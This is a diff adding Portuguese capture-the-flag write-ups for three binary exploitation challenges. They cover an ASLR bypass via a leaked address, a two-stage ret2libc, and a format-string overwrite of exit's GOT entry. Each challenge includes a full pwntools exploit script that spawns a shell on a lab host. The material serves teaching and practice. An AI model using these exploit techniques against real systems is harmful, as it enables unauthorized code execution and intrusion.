@@ -308,3 +308,290 @@ p.interactive()
 '''
 
 Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do quarto desafio.
+
+##Desafio: Random Memories (Exploração Binária)
+
+###Introdução:
+
+Esta é uma continuação da vulnerabilidade ret2win anterior. No entanto, desta vez estamos lidando com ASLR (Address Space Layout Randomization). Novamente, temos uma função win() cujo endereço queremos sobrescrever no registrador $rsp.
+O ASLR é uma técnica de segurança que randomiza os endereços de memória, tornando mais difícil para um atacante prever a localização de funções críticas. Este mecanismo pode ser contornado (bypassed) se recebermos endereços vazados (leaked addresses), pois podemos determinar o offset relativo ao endereço base a partir desse vazamento.
+
+### Análise inicial:
+
+O programa exibe o endereço da função vuln() (o "vazamento"), em seguida, solicita uma entrada. Ele lê 512 bytes para um buffer de apenas 32 bytes, causando um buffer overflow. A função win() não é chamada diretamente.
+
+'''bash
+int win(){
+    system("/bin/sh\0");
+}
+
+void vuln(){
+    char *buf[0x20]; // Buffer de 32 bytes
+    printf("I can give you a secret %llx\n", &vuln); // O LEAK
+    puts("Where are we going? : ");
+    read(0, buf, 0x200); // Lê 512 bytes
+    puts("\nok, let's go!\n");
+}
+
+int main(){
+    setup();
+    banner();
+    vuln();
+}
+'''
+
+Ao executar o random, ele nos dá o "segredo": o endereço da função vuln(), que muda a cada execução por causa do ASLR.
+Como no desafio anterior, precisamos do offset para o $rsp. Usando GDB e um padrão cíclico (cyclic pattern), determinamos que o offset é, novamente, 264 bytes.
+
+Em seguida, precisamos dos offsets (distância do início do binário) das funções vuln e win. Podemos encontrá-los facilmente com o objdump:
+
+'''bash
+objdump -d ./random | grep vuln
+objdump -d ./random | grep win
+'''
+
+Ao contrário do desafio anterior (onde o endereço de win era estático), agora precisamos calcular o endereço real de win em tempo de execução. O endereço base é o endereço inicial onde o código do binário é carregado na memória.
+
+A fórmula para contornar o ASLR é:
+
+1. Endereço_Base = Endereço_Vazado_vuln - Offset_vuln
+
+2. Endereço_Real_win = Endereço_Base + Offset_win
+
+### Solução 
+Com nosso script Pwntools, nós:
+
+1. Recebemos o endereço vazado da vuln().
+
+2. Calculamos o endereço base do binário (usando os offsets encontrados com o objdump).
+
+3. Calculamos o endereço real da win() e do ret gadget (necessário para alinhamento da pilha).
+
+4. Montamos o payload: 264 bytes de lixo + ret gadget + endereço da win().
+
+5. Enviamos o payload e obtemos a shell.
+
+<!-- end list -->
+
+'''bash
+from pwn import *
+
+# Inicia o processo
+#p = process('./random')
+p = remote('10.10.23.250', 9007)
+
+# 1. Recebe o leak do endereço da 'vuln'
+p.recvuntil(b"I can give you a secret ")
+leaked_vuln_addr = int(p.recvline().strip(), 16)
+log.info(f"Endereço 'vuln' vazado: {hex(leaked_vuln_addr)}")
+
+# Offsets obtidos com objdump
+vuln_offset = 0x1319  # Offset da vuln
+win_offset = 0x1210   # Offset da win
+
+# 2. Calcula o endereço base do binário
+base_address = leaked_vuln_addr - vuln_offset
+log.info(f"Endereço base: {hex(base_address)}")
+
+# 3. Calcula os endereços reais
+win_address = base_address + win_offset
+log.success(f"Endereço da 'win': {hex(win_address)}")
+
+# Calcula o endereço do gadget 'ret' (para alinhamento da pilha)
+ret_offset = 0x101a  # Offset do 'ret' (encontrado com objdump/ROPgadget)
+ret_gadget = base_address + ret_offset
+log.success(f"Endereço do 'ret' gadget: {hex(ret_gadget)}")
+
+# 4. Cria o payload
+payload = b"A" * 264          # Padding até o RSP
+payload += p64(ret_gadget)    # Gadget 'ret' para alinhar a pilha
+payload += p64(win_address)   # Sobrescreve end. de retorno com 'win'
+
+# Loga o payload
+log.info(f"Payload: {payload}")
+
+# 5. Envia o payload
+p.sendline(payload)
+
+# Interage com a shell
+p.interactive()
+'''
+
+Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do desafio.
+
+'.     '
+
+## Desafio: The librarian (Exploração Binária)
+
+### Introdução:
+Este desafio é uma exploração binária ret2libc que requer múltiplos estágios. O processo é dividido em duas partes principais:
+
+1. Estágio 1 (Leak de Endereço): Usamos a técnica ret2plt para vazar um endereço da libc. Fazemos isso chamando a função puts através da PLT (Procedure Linkage Table) e passando como argumento o seu próprio endereço na GOT (Global Offset Table). Isso faz com que o programa imprima o endereço real da puts na memória.
+
+2. Estágio 2 (Exploit): Com o endereço vazado, calculamos o endereço base da libc. Com isso, podemos encontrar o endereço de qualquer função (como system) e de strings (como "/bin/sh"). Em seguida, enviamos um segundo payload ret2libc para chamar system("/bin/sh") e obter uma shell.
+
+### Análise inicial:
+Primeiro, executamos a aplicação no GDB. Criamos um padrão cíclico (cyclic pattern) de tamanho suficiente e o passamos para o programa.
+Após o crash, determinamos que o offset para sobrescrever o endereço de retorno (e controlar o $rsp) é de 264 bytes.
+O primeiro payload é cuidadosamente montado para vazar o endereço e, crucialmente, retornar à função main para que possamos enviar o segundo payload:
+
+• padding = b"A" * 264: Preenche o buffer até o endereço de retorno.
+• payload += p64(rop.find_gadget(['ret'])[0]): Adiciona um gadget ret para garantir o alinhamento da pilha.
+• payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]): Gadget pop rdi; ret para carregar nosso argumento (o endereço da puts@got) no registrador RDI.
+• payload += p64(binary.got.puts): O endereço de puts na GOT, que será passado como argumento para a própria puts.
+• payload += p64(binary.plt.puts): Chama a puts através da PLT, que imprimirá o endereço que está na GOT.
+• payload += p64(binary.symbols.main): Retorna à função main, permitindo-nos enviar um segundo payload.
+
+Ao rodar o script parcial (primeiro estágio), vemos que o ASLR está ativo e os endereços mudam a cada execução.
+
+### Solução:
+O script final combina as duas etapas. Ele envia o primeiro payload, recebe o leak da puts, e então calcula o endereço base da libc.
+A linha libc.address = leak - libc.symbols.puts calcula o endereço base da libc subtraindo o offset conhecido da puts (encontrado no arquivo libc.so.6) do endereço que vazamos em tempo de execução. Isso nos permite contornar o ASLR.
+Com o endereço base, calculamos os endereços de system e da string "/bin/sh" (cujos offsets foram encontrados previamente) e enviamos o segundo payload para obter a shell.
+
+'''bash
+from pwn import * binary_file = './thelibrarian'
+libc = ELF('./libc.so.6')
+
+# Conecta ao alvo remoto
+p = remote('10.10.23.250', 9008)
+#p = process(binary_file) # Para testes locais
+
+context.binary = binary = ELF(binary_file, checksec=False)
+rop = ROP(binary)
+
+# --- Estágio 1: Vazar o endereço da 'puts' ---
+
+padding = b"A" * 264
+payload = padding
+payload += p64(rop.find_gadget(['ret'])[0]) # Gadget 'ret' para alinhamento
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # pop rdi; ret
+payload += p64(binary.got.puts) # Argumento para puts (seu próprio endereço na GOT)
+payload += p64(binary.plt.puts) # Chamar puts@plt
+payload += p64(binary.symbols.main) # Retornar para main
+
+p.recvuntil(b"Again? Where this time? : \n")
+p.sendline(payload)
+p.recvuntil(b"ok, let's go!\n\n")
+
+# Ler o endereço vazado
+leak = u64(p.recvline().strip().ljust(8, b'\0'))
+log.info(f'Puts leak => {hex(leak)}')
+
+# Calcular o endereço base da libc
+libc.address = leak - libc.symbols.puts
+log.info(f'Libc base => {hex(libc.address)}')
+
+# Offsets manuais (podem ser encontrados com 'readelf -s libc.so.6 | grep system' e 'strings -ax -t x libc.so.6 | grep /bin/sh')
+bin_sh_offset = 0x1b3d88
+system_offset = 0x4f420
+
+# Calcular endereços reais
+bin_sh = libc.address + bin_sh_offset
+system = libc.address + system_offset
+
+log.info(f'/bin/sh address => {hex(bin_sh)}')
+log.info(f'system address => {hex(system)}')
+
+# --- Estágio 2: Chamar system("/bin/sh") ---
+
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # pop rdi; ret
+payload += p64(bin_sh)            # Argumento RDI: endereço de "/bin/sh"
+payload += p64(system)            # Chamar system()
+payload += p64(rop.find_gadget(['ret'])[0]) # 'ret' para alinhamento (opcional, boa prática)
+payload += p64(0x0) 
+
+p.recvuntil(b"Again? Where this time? : \n")
+p.sendline(payload)
+p.recvuntil(b"ok, let's go!\n\n")
+
+# Interagir com a shell
+p.interactive()
+'''
+
+Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do sexto desafio.
+
+'.        '
+
+##Desafio: Not Specified (Exploração Binária)
+
+###Introdução
+
+Neste desafio, estamos lidando com uma vulnerabilidade de Format String. Isso nos lembrou do desafio format string2 do picoCTF, mas aqui não temos nenhuma variável óbvia na stack para sobrescrever com nosso conteúdo.
+
+### Análise inicial:
+O programa pede um nome de usuário (username) e o imprime usando printf sem qualquer proteção de formatação, tornando-o vulnerável a um ataque de format string.
+Além disso, o código-fonte revela uma função win() que contém uma chamada para system("/bin/sh"). Se conseguirmos explorar a falha para executar essa função, obteremos uma shell.
+
+'''bash
+int win(){
+    system("/bin/sh\0");
+}
+
+int main(){
+    setup();
+    banner();
+    char *username[32];
+    puts("Please provide your username\n");
+    read(0,username,sizeof(username)); // Recebe a entrada
+    puts("Thanks! ");
+    printf(username); // VULNERABILIDADE: printf direto da entrada
+    puts("\nbye\n");
+    exit(1);    
+}
+'''
+
+Ao executar o notspecified, ele se comporta como esperado: após inserir um nome de usuário, ele é impresso na tela.
+A vulnerabilidade printf(username) permite que um usuário forneça especificadores de formato (como %s, %x, %n), o que pode levar a leituras ou escritas arbitrárias na memória.
+Primeiro, vamos descobrir onde nossa entrada está na pilha (o "offset"). Usamos o seguinte comando para vazar a pilha:
+
+'''bash
+python -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" | ./notspecified | grep 4847
+'''
+
+Vemos, na sexta posição, o conteúdo da nossa entrada (o 4847... é o hexadecimal para HG... da nossa string ABCDEFGH). Isso significa que nosso offset é 6.
+
+### Solução 
+Como podemos não apenas ler, mas também escrever na memória (usando %n), podemos alterar o fluxo do programa.
+A estratégia será usar a vulnerabilidade de format string para sobrescrever a entrada da GOT (Global Offset Table) da função exit() com o endereço da função win().
+O programa termina com uma chamada a exit(1). Ao sequestrar o ponteiro de exit@got, faremos com que o programa, ao tentar sair, execute a função win() e nos dê a shell.
+Embora isso possa ser feito manualmente (o que pode ser complicado devido ao alinhamento da pilha no Ubuntu), podemos usar a função fmtstr_payload do Pwntools para automatizar a criação do payload.
+
+'''bash
+from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
+from pwn import *
+
+# Configura o contexto da arquitetura
+context.clear(arch = 'amd64', endian ='little')
+
+# Função wrapper para enviar o payload
+def send_payload(payload):
+        s.recvline()
+        s.sendline(payload)
+        r = s.recvline()
+        return r
+
+elf = ELF('./notspecified')
+
+# Pega os endereços que precisamos
+exit_got = elf.got['exit'] # O endereço que queremos sobrescrever
+win_func = elf.symbols['win'] # O endereço que queremos escrever
+
+# Conexão
+#s = process('./notspecified') # Teste local
+s = remote('10.10.23.250', 9009) # Alvo
+
+# Gera o payload: "Escreva 'win_func' no endereço 'exit_got', usando o offset 6"
+payload = fmtstr_payload(6, {exit_got: win_func})
+
+print(payload)
+print(send_payload(payload))
+
+# Recebe a shell
+s.interactive()
+'''
+
+Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do sétimo desafio.
+
+'.        '
